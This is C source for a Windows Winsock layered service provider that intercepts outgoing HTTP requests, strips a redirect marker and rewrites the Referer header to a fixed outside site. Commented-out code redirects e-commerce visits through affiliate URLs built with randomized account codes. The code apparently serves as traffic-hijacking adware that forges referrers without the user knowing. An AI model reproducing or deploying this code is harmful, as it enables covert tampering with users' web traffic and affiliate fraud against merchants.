#include "lspdef.h"
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>


LPSTR g_pRedirectIdentify = "/";

static BOOL GetHttpHeaderValue(char **headers, int n, const char *header, char **value)
{
	int i;

	for (i = 0; i < n; i++) {
		const char *p1 = header;
		char *p2 = headers[i];
		while (*p1 && tolower(*p1++) == tolower(*p2++))
			;
		if (*p1 == 0) {
			*value = p2;
			return TRUE;
		}
	}

	return FALSE;
}

static int MatchingEBusiness(const char *host)
{
    /*
	int i;

	for (i = 0; i < g_pRedirectInfo->iNumberOfEBusiness; i++) {
		if (HostEndsWith(host, g_pRedirectInfo->pEBusiness[i].pDomain)) {
			return i;
		}
	}
*/
	return 0;
}

static LPSTR getModifiedReferrerHeader(VOID) {
	return "Referer: http://www.sjwyb.com\r\n";
}

PGAUSSBUF CreateGaussBuf(DWORD dwBufferSize)
{
	PGAUSSBUF pGaussBuf;
	int iErrno;

	pGaussBuf = LspAlloc(dwBufferSize + sizeof(GAUSSBUF), &iErrno);
	if (pGaussBuf) {
		pGaussBuf->pBuffer = (PCHAR)pGaussBuf + sizeof(GAUSSBUF);
		pGaussBuf->dwBufferSize = dwBufferSize;
		pGaussBuf->pDataStart = pGaussBuf->pBuffer;
		pGaussBuf->pDataEnd = pGaussBuf->pBuffer;
	}

	return pGaussBuf;
}

VOID FreeGaussBuf(PGAUSSBUF *pGaussBuf)
{
	if (*pGaussBuf) {
		LspFree(*pGaussBuf);
		*pGaussBuf = NULL;
	}
}

VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCount)
{
	PGAUSSBUF pSendBuffer;
	char *startLine;
	char *headers[HTTP_HEADER_MAX];
	char *body;
	int numHeaders;
	char url[URL_MAX_LENGTH], *urlpath;
	int ebindex;
	char *host, *accept; 

	// assemble http request buffer
	{
		int i, len;

		for (i = 0, len = 0; i < (int)dwBufferCount; i++)
			len += lpBuffers[i].len;

		if (len > HTTP_REQUEST_MAX_LENGTH)
			return;

		// allocate more memory than needed so we can hold modified referrer header.
		// also include a NUL character
		pSendBuffer = CreateGaussBuf(len + 256);
		if (!pSendBuffer) {
			dbgprint("allocate memory for send buffer failed");
			return ;
		}

		// fill up send buffer with http request and include '0' character
		for (i = 0; i < (int)dwBufferCount; i++) {
			memcpy(pSendBuffer->pDataEnd, lpBuffers[i].buf, lpBuffers[i].len);
			pSendBuffer->pDataEnd += lpBuffers[i].len;
		}
		*(pSendBuffer->pDataEnd) = 0;
	}

	// parse http
	{
		char *next, *prev;

		startLine = NULL;
		body = NULL;
		numHeaders = 0;
		next = prev = pSendBuffer->pDataStart;

		while ((next = strstr(next, "\r\n")) && numHeaders < HTTP_HEADER_MAX) {
			*next = 0;

			if (!startLine)
				startLine = prev;
			else
				headers[numHeaders++] = prev;

			next += 2;

			if (*next == 0)
				break;

			if (*next == '\r' && *(next + 1) == '\n') {
				if (numHeaders > 0) {
					body = next + 2;
					goto main_point;
				} else {
					break;
				}
			}

			prev = next;
		}

		goto release_sendbuffer;
	}

main_point:

	/* parse accpet header */
	if (!GetHttpHeaderValue(headers, numHeaders, "accept: ", &accept) ||
		!strstr(accept, "text/html"))
		goto release_sendbuffer;

	/* parse host header */
	if (!GetHttpHeaderValue(headers, numHeaders, "host: ", &host))
		goto release_sendbuffer;

	if ((ebindex = MatchingEBusiness(host)) < 0)
		goto release_sendbuffer;

	/* parse  url  */
	{
		char *bp, *ep;
		int n;

		bp = startLine + 4;   /* skip "GET " */
		if (!(ep = strchr(bp, ' ')))
			goto release_sendbuffer;
		*ep = 0;

		if (memcmp("http://", bp, 7) != 0) {
			n = _snprintf(url, sizeof(url), "http://%s", host);
			if (n + strlen(bp) >= sizeof(url))
				goto release_sendbuffer;
			strcat(url, bp);
		}  else {
			n = _snprintf(url, sizeof(url), "%s", bp);
			if (n < 0 || n == sizeof(url))
				goto release_sendbuffer;
		}

		urlpath = strchr(url + 7, '/');
		*ep = ' ';
	}

	if (ebindex == 0) { // linktect
		if (memcmp(urlpath, g_pRedirectIdentify, strlen(g_pRedirectIdentify)) == 0) {
			char *p1, *p2;
			char *referrer_header, *modified_referrer_header;
			int referrer_header_len;
			int freesize;
			BOOL drop_referrer = FALSE;

			// do two things:
			// 1. drop redirect identifier
			// 2. modify referrer header

			modified_referrer_header = getModifiedReferrerHeader();

			// check if send buffer is big enough to hold modified referrer header
			if (!GetHttpHeaderValue(headers, numHeaders, "referer: ", &referrer_header)) {
				referrer_header = body - 2;
				referrer_header_len = 0;
			} else {
				referrer_header -= strlen("referer: ");
				referrer_header_len = strlen(referrer_header) + 2;
			}

			freesize = referrer_header_len + (strlen(g_pRedirectIdentify) - 1) +
				(pSendBuffer->dwBufferSize - (pSendBuffer->pDataEnd - pSendBuffer->pDataStart));

			if (freesize < (int)strlen(modified_referrer_header)) {
				dbgprint("send buffer has not enough memory to hold modified referrer header. "
					"so we drop it");
				drop_referrer = TRUE;
			}

			// restore send  buffer
			if (startLine)
				*(startLine + strlen(startLine)) = '\r';

			while (numHeaders-- > 0) {
				*(headers[numHeaders] + strlen(headers[numHeaders])) = '\r';
			}

			// drop redirect identifier
			p1 = strstr(pSendBuffer->pDataStart, g_pRedirectIdentify);
			p2 = p1 + strlen(g_pRedirectIdentify) - 1;
			memmove(p1, p2, pSendBuffer->pDataEnd - p2) ;
			pSendBuffer->pDataEnd -= (strlen(g_pRedirectIdentify) - 1);
			referrer_header -= (strlen(g_pRedirectIdentify) - 1);

			// modify referrer
			if (drop_referrer) {
				p1 = referrer_header;
				p2 = referrer_header + referrer_header_len;
				memmove(p1, p2, pSendBuffer->pDataEnd - p2);
				pSendBuffer->pDataEnd -= referrer_header_len;
			} else {
				p1 = referrer_header + referrer_header_len;
				p2 = referrer_header + strlen(modified_referrer_header);
				memmove(p2, p1, pSendBuffer->pDataEnd - p1) ;
				pSendBuffer->pDataEnd += (p2 - p1);
				memcpy(referrer_header, modified_referrer_header, strlen(modified_referrer_header));
			}

			SocketContext->pSendBuffer = pSendBuffer;
			return;
		}
		goto release_sendbuffer;
	}

    /*
	EnterCriticalSection(&g_pRedirectInfo->Lock);
	if (g_pRedirectInfo->pEBusiness[ebindex].bIntercepted)
		goto release_sendbuffer;
	g_pRedirectInfo->pEBusiness[ebindex].bIntercepted = TRUE;
	LeaveCriticalSection(&g_pRedirectInfo->Lock);

	// build receive buffer
	{
		int account_index, n;
		char redirect_url[URL_MAX_LENGTH];
		int rcvbuf_len;
		PGAUSSBUF pReceiveBuffer;

		// build redirect url
		account_index = GetRandomizedAccountIndex();
		n = _snprintf(redirect_url, 
			sizeof(redirect_url), 
			g_pRedirectInfo->pRedirectUrlTemplate, 
			g_pRedirectInfo->pEBusiness[ebindex].pCode, 
			g_pRedirectInfo->pAccount[account_index].pCode,
			url);
		if (n < 0 || n == sizeof(redirect_url))
			goto release_sendbuffer;

		rcvbuf_len = strlen(g_pRedirectMessageTemplate) + n;
		if (!(pReceiveBuffer = CreateGaussBuf(rcvbuf_len))) {
			dbgprint("Gauss - error: allocate memory for recevie buffer failed");
			goto release_sendbuffer;
		}

		n = _snprintf(pReceiveBuffer->pBuffer, rcvbuf_len, g_pRedirectMessageTemplate, redirect_url);
		pReceiveBuffer->pDataEnd += n;

		SocketContext->pReceiveBuffer = pReceiveBuffer;

		goto release_sendbuffer;
	}
    */

release_sendbuffer:
	FreeGaussBuf(&pSendBuffer);

	return;
}